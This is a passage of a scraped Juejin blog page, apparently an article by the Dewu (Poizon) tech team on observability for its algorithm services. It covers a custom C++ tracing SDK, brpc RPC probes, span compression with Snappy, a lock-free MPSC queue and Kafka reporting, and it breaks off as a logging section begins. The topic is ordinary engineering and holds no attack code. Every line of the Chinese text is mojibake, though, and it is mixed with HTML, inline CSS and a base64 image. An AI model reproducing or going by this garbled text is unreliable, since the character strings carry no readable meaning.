content="å¾—ç‰©æŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/2392954206960247"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±åº¦å®è·µï¼šå¾—ç‰©ç®—æ³•åŸŸå…¨æ™¯å¯è§‚æµ‹æ€§ä» 0 åˆ° 1 çš„æ¼”è¿›ä¹‹è·¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2392954206960247/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¾—ç‰©æŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:09:12.000Z" title="Thu Jan 08 2026 07:09:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»20åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€å‰è¨€</h2>
<p>åœ¨å¾—ç‰©ï¼ˆPoizonï¼‰ä¸šåŠ¡åœºæ™¯ä¸­ï¼Œç®—æ³•ç”Ÿæ€å·²æ¼”è¿›ä¸ºæ¶µç›–äº¤æ˜“æœç´¢ã€ç¤¾åŒºæ¨èã€å›¾åƒè¯†åˆ«åŠå¹¿å‘Šç­–ç•¥çš„å¤šç»´å¤æ‚ç³»ç»Ÿã€‚è¯·æ±‚ä»Javaç½‘å…³ä¸‹å‘ï¼Œè¿›å…¥ C++ æ„å»ºçš„é«˜æ€§èƒ½ç®—æ³•æ ¸å¿ƒï¼ˆDSearchæ£€ç´¢ã€DGraphå›¾è®¡ç®—ã€DFeatureç‰¹å¾æå–ç­‰ï¼‰ã€‚</p>
<p>éšç€ç³»ç»Ÿå¤æ‚åº¦çš„æŒ‡æ•°çº§å¢é•¿ï¼Œæˆ‘ä»¬å¯¹ç°æœ‰ç³»ç»Ÿçš„å¯è§‚æµ‹æ€§è¿›è¡Œäº†å…¨é¢æ¢³ç†ï¼Œä¸ºäº†æé«˜ç¨³å®šæ€§ï¼Œæˆ‘ä»¬å¸Œæœ›å»ºè®¾ä¸€ä¸ª<strong>ä¸šåŠ¡åœºæ™¯ç»´åº¦å…¨é“¾è·¯å˜æ›´äº‹ä»¶ä¸­å¿ƒï¼Œ</strong> ä»¥â€œèšç„¦åšå¥½å¯è§‚æµ‹æ€§â€ä¸ºæ ¸å¿ƒç›®æ ‡ï¼Œé€šè¿‡å»ºè®¾ç›‘æ§å¹³å°çš„äº‹ä»¶ä¸­å¿ƒä¸å…¨é“¾è·¯å¯è§‚æµ‹çš„æ ¸å¿ƒäº§å“ï¼Œæ•´åˆå„å¹³å°èµ„æºä¸æ•°æ®ï¼Œæå‡ç³»ç»Ÿçš„æ•´ä½“é€æ˜åº¦å’Œç¨³å®šæ€§ï¼Œä»è€Œæå‡ä¸šåŠ¡ç¨³å®šæ€§å’Œæ•…éšœæ­¢è¡€æ•ˆç‡ï¼Œä¸ºäº§å“è¿­ä»£å¥ å®šåšå®çš„åŸºç¡€ã€‚</p>
<h2 data-id="heading-1">äºŒã€å¯è§‚æµ‹æ€§çš„â€œå››å¤§æ”¯æŸ±â€ä¸è”åŠ¨æ„¿æ™¯</h2>
<p>åœ¨ä¸šç•Œï¼Œå¯è§‚æµ‹æ€§é€šå¸¸è¢«å®šä¹‰ä¸ºTraceã€Metricå’ŒLogä¸‰ä½ä¸€ä½“ã€‚æˆ‘ä»¬çš„ç›®æ ‡æ˜¯æ‰“é€ ä¸€å¥— <strong>â€œä»¥åœºæ™¯ä¸ºé­‚ï¼Œä»¥è”åŠ¨ä¸ºéª¨â€</strong> çš„å¯è§‚æµ‹ä½“ç³»ï¼Œæ‰“ç ´æ•°æ®å­¤å²›ï¼Œå®ç°ç®—æ³•æ²»ç†çš„æ™ºèƒ½åŒ–è½¬å‹ã€‚æå‡ºäº† <strong>â€œå››å¤§æ”¯æŸ±è”åŠ¨â€ï¼š</strong></p>
<ul>
<li><strong>Traceä¸ºå¾„ï¼š</strong> è¶…è¶Šå•çº¯çš„æ‹“æ‰‘è®°å½•ã€‚é€šè¿‡<strong>Baggage</strong>æœºåˆ¶ï¼Œå°†å¤æ‚çš„ä¸šåŠ¡è¯­ä¹‰ä¸ç®—æ³•ç­–ç•¥æ³¨å…¥é“¾è·¯ï¼Œå®ç°è°ƒç”¨æµä¸ä¸šåŠ¡æµçš„æ·±åº¦è€¦åˆã€‚</li>
<li><strong>Metricä¸ºè„‰ï¼š</strong> é€šè¿‡Traceè‡ªåŠ¨ç”Ÿæˆåœºæ™¯åŒ–çš„æ€§èƒ½æŒ‡æ ‡ã€‚å¹¶ç»“åˆ<strong>å…ƒæ•°æ®</strong>å…³è”æœåŠ¡ç«¯ä¸šåŠ¡æŒ‡æ ‡ï¼Œå®ç°æŒ‡æ ‡é—´çš„è”åŠ¨ã€‚</li>
<li><strong>Logä¸ºè¯ï¼š</strong> æ¨åŠ¨å…¨é“¾è·¯æ—¥å¿—æ ¼å¼åŒ–æ²»ç†ã€‚è§„èŒƒå¼‚å¸¸ç å’Œä¸šåŠ¡ç ã€‚</li>
<li><strong>Eventä¸ºæºï¼š</strong> ç®—æ³•ç³»ç»Ÿçš„çµé­‚åœ¨äºæ¼”è¿›ã€‚æ‰“é€šç®—æ³•ä¾§<strong>10+ä¸ªå˜æ›´å¹³å°ï¼Œ</strong> å°†æ—¥å‡ä¸Šä¸‡+çš„å˜æ›´äº‹ä»¶å®æ—¶æ˜ å°„è‡³é“¾è·¯æ‹“æ‰‘ã€‚</li>
</ul>
<h2 data-id="heading-2">ä¸‰ã€æ ¸å¿ƒæ”»åšï¼šå¯è§‚æµ‹æ€§æ ‡å‡†åŒ–</h2>
<h3 data-id="heading-3">Traceæ ‡å‡†åŒ–</h3>
<p>åœ¨å¾—ç‰©ç®—æ³•ç”Ÿæ€ä¸­ï¼Œ<strong>DMergeã€DScatterã€DGraphã€DSearchã€DFeature</strong>ç­‰æ ¸å¿ƒç»„ä»¶æ‰¿è½½ç€æè‡´çš„æ€§èƒ½è¯‰æ±‚ã€‚ç”±äºC++ä¾§Trace SDKçš„é•¿æœŸç¼ºå¤±ï¼Œç®—æ³•æœåŠ¡æ›¾å¤„äºå¾®æœåŠ¡è§‚æµ‹ä½“ç³»çš„â€œå­¤å²›â€ï¼Œéš¾ä»¥ä¸ä¸Šä¸‹æ¸¸å®ç°å…¨é“¾è·¯ä¸²è”ã€‚</p>
<p>C++ Trace2.0ï¼ˆå¾—ç‰©åˆ†å¸ƒå¼é“¾è·¯è¿½è¸ªTrace2.0åŸºäºOpenTelemetryäºŒæ¬¡å¼€å‘ï¼Œç›®å‰å·²ç»æ”¯æŒJava/Go/JS/Pythonè¯­è¨€ï¼‰å¹¶æ²¡æœ‰åŸºäºOpenTelemetry CPPè¿›è¡ŒäºŒæ¬¡å¼€å‘ä¸»è¦è€ƒè™‘ä»¥ä¸‹å‡ ç‚¹ï¼š</p>
<ul>
<li><strong>æè‡´æ€§èƒ½ä¸å¯æ§å¼€é”€è¦æ±‚ï¼š</strong> C++ä¾§æœåŠ¡ä½äºè¯·æ±‚é“¾è·¯å…³é”®è·¯å¾„ï¼Œå¯¹RTä¸å°¾å»¶è¿Ÿæå…¶æ•æ„Ÿï¼Œéœ€è¦å¯¹<strong>Spanåˆ›å»ºã€ä¸Šä¸‹æ–‡ä¼ æ’­ã€å±æ€§å†™å…¥</strong>ç­‰æ“ä½œè¿›è¡Œä¸¥æ ¼çš„CPUä¸å†…å­˜å¼€é”€æ§åˆ¶ï¼Œå¹¶å¯¹å†…å­˜åˆ†é…ã€é”ç«äº‰åŠçº¿ç¨‹åˆ‡æ¢å…·å¤‡ä¸¥æ ¼å¯æ§æ€§ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼ŒOpenTelemetry C++ SDKæ›´åå‘<strong>é€šç”¨æ€§ä¸æ ‡å‡†å®Œå¤‡æ€§ï¼Œ</strong> å…¶æŠ½è±¡å±‚æ¬¡ä¸æ‰©å±•ç‚¹åœ¨éƒ¨åˆ†é«˜QPSåœºæ™¯ä¸‹å­˜åœ¨ä¸å¯å¿½ç•¥çš„æ€§èƒ½ä¸ç¡®å®šæ€§ã€‚</li>
<li><strong>åŸç”ŸSDKè¡Œä¸ºä¸é€æ˜å¸¦æ¥çš„å·¥ç¨‹é£é™©ï¼š</strong> OpenTelemetry C++ SDK å†…éƒ¨å®ç°è¾ƒä¸ºå¤æ‚ï¼Œå¯èƒ½åŒ…å«éšå¼çº¿ç¨‹ã€åå°ä»»åŠ¡æˆ–å¤æ‚ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼Œåœ¨æç«¯å¹¶å‘æˆ–å¼‚å¸¸åœºæ™¯ä¸‹çš„é—®é¢˜å®šä½ä¸è¾¹ç•Œæ§åˆ¶æˆæœ¬è¾ƒé«˜ï¼Œè€Œå¯¹æºç å®Œæ•´è¯„ä¼°çš„æˆæœ¬åŒæ ·é«˜æ˜‚ã€‚</li>
</ul>

<ul>
<li><strong>brpc+bthreadè¿è¡Œæ¨¡å‹çš„å…¼å®¹æ€§æ‹…å¿§ï¼š</strong> C++ æœåŠ¡å¤§é‡åŸºäºbrpcä¸bthreadç”¨æˆ·æ€è°ƒåº¦æ¨¡å‹ï¼Œè‹¥SDKå†…éƒ¨ä¾èµ–pthreadæˆ–å¼•å…¥é¢å¤–ç³»ç»Ÿçº¿ç¨‹ï¼Œå¯èƒ½å½±å“bthread workerçš„è°ƒåº¦è¡Œä¸ºï¼Œå­˜åœ¨è¿è¡Œæ—¶çš„å…¼å®¹é£é™©ã€‚</li>
<li><strong>å·¥ç¨‹ä¾èµ–ä¸ç¬¦å·å†²çªé£é™©ï¼ˆå°¤å…¶æ˜¯Protobufï¼‰ï¼š</strong> ç°æœ‰å·¥ç¨‹ä¾èµ–ç‰¹å®šç‰ˆæœ¬çš„protobufï¼Œè€ŒOpenTelemetry C++ SDKå¯¹å…¶ä¾èµ–æ ˆæœ‰ç‹¬ç«‹ç‰ˆæœ¬è¦æ±‚ï¼Œåœ¨é™æ€æˆ–æ··åˆé“¾æ¥åœºæ™¯ä¸‹å­˜åœ¨ç¬¦å·æ³„æ¼ä¸ABIå†²çªé£é™©ï¼Œæ•´ä½“å·¥ç¨‹ç¨³å®šæ€§ä¸å¯æ§ã€‚</li>
</ul>
<p><strong>SDKæ¡†æ¶</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd3f89c886114ce0850d014a4f17d58b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=koAEVne80uVAIXpWJG6NindIxP8%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<ul>
<li><strong>APM Cpp SDKï¼š</strong> å®ç°Spançš„åˆ›å»ºã€é‡‡é›†å’Œä¸ŠæŠ¥ï¼ŒåŒæ—¶ä¸æ§åˆ¶å¹³é¢å¯¹æ¥å®ç°å¿ƒè·³å’Œé…ç½®çƒ­æ›´æ–°ï¼ŒåŸºäºkafkaä¸ŠæŠ¥Traceã€‚</li>
<li><strong>brpc-tracerï¼š</strong> brpcæ¡†æ¶é€‚é…å±‚ï¼Œæ”¯æŒhttpä¸baidu-stdåè®®çš„è‡ªåŠ¨ä¸ŠæŠ¥æ¢é’ˆã€‚</li>
<li><strong>å¼•æ“æ¥å…¥ï¼š</strong> ä¸šåŠ¡ä¾§é€šè¿‡ä¾èµ–brpc-tracerï¼Œæ”¯æŒé“¾è·¯ä¸ŠæŠ¥ã€‚</li>
</ul>
<p><strong>æŠ¥æ–‡å‹ç¼©æ–¹æ¡ˆ</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a8d9e1595a31487a9736878a74f49477~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=Mip9GH25g1ylB6MEx2RFL8%2F2dZA%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>é€šè¿‡å¯¹æŠ¥æ–‡è¿›è¡Œå‹ç¼©ï¼Œæ˜¾è‘—é™ä½Traceä¸ŠæŠ¥è¿‡ç¨‹ä¸­çš„å¸¦å®½æ¶ˆè€—ï¼Œå‡å°‘é“¾è·¯æ•°æ®ä¸ä¸šåŠ¡è¯·æ±‚åœ¨å¸¦å®½ä¸Šçš„ç«äº‰ï¼Œé¿å…å¯¹æ­£å¸¸è¯·æ±‚å“åº”æ—¶å»¶äº§ç”Ÿå¹²æ‰°ï¼Œä¿éšœä¸šåŠ¡æœåŠ¡ç¨³å®šæ€§ã€‚</p>
<p><strong>å‹ç¼©ç­–ç•¥ï¼š</strong></p>
<p><strong>é•¿åº¦è¿‡æ»¤ï¼š</strong> å¯¹å†™çš„å±æ€§ã€äº‹ä»¶ã€å¼‚å¸¸è¿›è¡Œkeyã€valueé•¿åº¦é™åˆ¶ï¼Œå¯¹Spançš„æ•´ä½“è¿›è¡Œé•¿åº¦é™åˆ¶ï¼Œè¶…å‡ºé˜ˆå€¼éƒ¨åˆ†è¿›è¡Œæˆªæ–­ï¼Œé˜ˆå€¼å®ç°äº†æ§åˆ¶å¹³é¢çš„<strong>åŠ¨æ€æ›´æ–°ã€‚</strong></p>
<p><strong>å­—æ®µå‹ç¼©ï¼š</strong> å°½å¯èƒ½çš„å¯¹åè®®ä¸­çš„æ‰€æœ‰å­—æ®µè¿›è¡Œäº†å‹ç¼©ï¼Œä¾‹å¦‚ï¼Œ16è¿›åˆ¶å­—ç¬¦ä¸²æ‰“åŒ…ä¸º2è¿›åˆ¶ï¼Œé€šç”¨å­—æ®µçœç•¥keyï¼Œé€šè¿‡å·®å€¼æ›¿ä»£ç»“æŸæ—¶é—´ç­‰ã€‚</p>
<p><strong>æ‰¹é‡èšåˆï¼š</strong> å°†å¤šæ¡Spanè¿›è¡Œåˆå¹¶ï¼Œä½œä¸ºä¸€æ¡æŠ¥æ–‡è¿›è¡Œä¸ŠæŠ¥ï¼Œå¢åŠ ååé‡çš„åŒæ—¶ï¼Œå‡å°‘kafkaé›†ç¾¤å’Œå¸¦å®½å‹åŠ›ã€‚èšåˆé˜ˆå€¼ä¹Ÿå®ç°äº†æ§åˆ¶å¹³é¢åŠ¨æ€æ›´æ–°ã€‚</p>
<p><strong>é™æ€ä¿¡æ¯æŠ½å–ï¼š</strong> å¯¹è¿›ç¨‹çº§åˆ«çš„é™æ€ä¿¡æ¯ä»Spanå¯¹è±¡ä¸­å‰¥ç¦»ï¼Œæ¯ä¸ªèšåˆæŠ¥æ–‡åªæ·»åŠ ä¸€ä¸ªé™æ€ä¿¡æ¯å‰¯æœ¬ã€‚</p>
<p><strong>Snappyå‹ç¼©ï¼š</strong> å…ˆå¯¹èšåˆåçš„æ¶ˆæ¯åºåˆ—åŒ–ï¼Œå†è¿›è¡ŒSnappyå‹ç¼©ï¼Œç»éªŒå‹ç¼©æ¯”æ˜¯30%å·¦å³ã€‚</p>
<p><strong>å¼‚æ­¥ä¸ŠæŠ¥å’ŒMPSCæ— é”ç¯é˜Ÿåˆ—</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7e63931b7a4453f818d86dce85bf96d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=taBICwUAutazZ06hK5DXCXENOv8%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<ul>
<li><strong>å¼‚æ­¥ä¸ŠæŠ¥ï¼š</strong> Spané‡‡é›†åå†™å…¥é˜Ÿåˆ—ï¼Œç”±å¼‚æ­¥çº¿ç¨‹æ‰¹é‡å¤„ç†å¹¶æŠ•é€’è‡³Kafkaï¼›å½“é˜Ÿåˆ—å·²æ»¡æˆ–ä¸ŠæŠ¥å¤±è´¥æ—¶ç›´æ¥ä¸¢å¼ƒï¼Œé¿å…é˜»å¡ä¸šåŠ¡çº¿ç¨‹åŠå†…å­˜è†¨èƒ€ã€‚</li>
<li><strong>MPSCæ— é”å¾ªç¯é˜Ÿåˆ—ï¼š</strong> MPSCæ˜¯æ”¯æŒå¤šç”Ÿäº§è€…å•æ¶ˆè´¹è€…çš„æ— é”é˜Ÿåˆ—ç»“æ„ï¼Œåˆ©ç”¨å¾ªç¯æ•°ç»„å®ç°é«˜æ•ˆæ•°æ®ä¼ é€’ã€‚é€šè¿‡åŸå­æ“ä½œé¿å…åŠ é”ï¼Œå‡å°‘çº¿ç¨‹ç«äº‰å¸¦æ¥çš„ä¸Šä¸‹æ–‡åˆ‡æ¢å’Œæ€§èƒ½å¼€é”€ã€‚åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹èƒ½æä¾›æ›´ç¨³å®šçš„ååé‡å’Œæ›´ä½çš„å»¶è¿Ÿï¼Œä¿è¯é˜Ÿåˆ—æ“ä½œçš„é«˜æ•ˆæ€§å’Œå¯é¢„æµ‹æ€§ã€‚</li>
</ul>
<p><strong>RPCæ¢é’ˆ</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8fbb54c929184160b2f6cad8f387bf36~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=jTMz8g8rj3DuUwE3XjL%2F9MSJ4xs%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><strong>RPC æ¢é’ˆå®ç°äº†</strong>åœ¨åè®®å±‚å¯¹è¯·æ±‚ç”Ÿå‘½å‘¨æœŸçš„ç»Ÿä¸€æ„ŸçŸ¥ä¸Traceè‡ªåŠ¨åŒ–å¤„ç†ï¼Œæ”¯æŒBRpcå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯åœ¨æ— ä¸šåŠ¡ä¾µå…¥çš„å‰æä¸‹å®ŒæˆTraceçš„è‡ªåŠ¨é‡‡æ ·ä¸ä¸ŠæŠ¥ã€‚</p>
<p>é’ˆå¯¹ä¸åŒé€šä¿¡åœºæ™¯ï¼Œåœ¨åè®®å±‚å¼•å…¥ç»Ÿä¸€çš„RPCæ¢é’ˆï¼Œé€šè¿‡åŸ‹ç‚¹å›è°ƒå¯¹è¯·æ±‚ç”Ÿå‘½å‘¨æœŸè¿›è¡Œæ‹¦æˆªï¼Œå®ç°Traceçš„è‡ªåŠ¨é‡‡æ ·ä¸åŸ‹ç‚¹ã€‚</p>
<p><strong>ä¸Šçº¿æ•ˆæœ</strong></p>
<ul>
<li>æ”¯æŒtrace_idé“¾è·¯æŸ¥è¯¢ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f34f34ec7ae417c918ddcc3e7324b35~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=Ytbtp9Oq6Jfn8JRSvOCI7d2V0xI%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<ul>
<li>æ”¯æŒæŒ‡æ ‡ç»´åº¦ï¼ˆå¼‚å¸¸ï¼ŒRTèŒƒå›´ç­‰ï¼‰çš„é“¾è·¯æŸ¥è¯¢ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/587031999df74920a5c81a9076713e2c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=3ykDJay%2BBrzmOcyg0%2FT2Fs3L%2BdY%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<h3 data-id="heading-4">Logæ ‡å‡†åŒ–</h3>
<p>åœ¨å…¨é“¾è·¯å¯è§‚æµ‹ä½“ç³»ä¸­ï¼Œæ—¥å¿—æ˜¯è¿˜åŸä¸šåŠ¡ç°åœºçš„æœ€ç»ˆè¯æ®ã€‚é’ˆå¯¹ç®—æ³•ä¾§<strong>Java ä¾§è§„èŒƒã€C++ ä¾§æ‚ä¹±</strong>çš„ç°çŠ¶ï¼Œæˆ‘ä»¬å®æ–½äº†æ·±åº¦å¯¹é½ä¸è¯­ä¹‰é‡æ„ã€‚</p>
<ul>
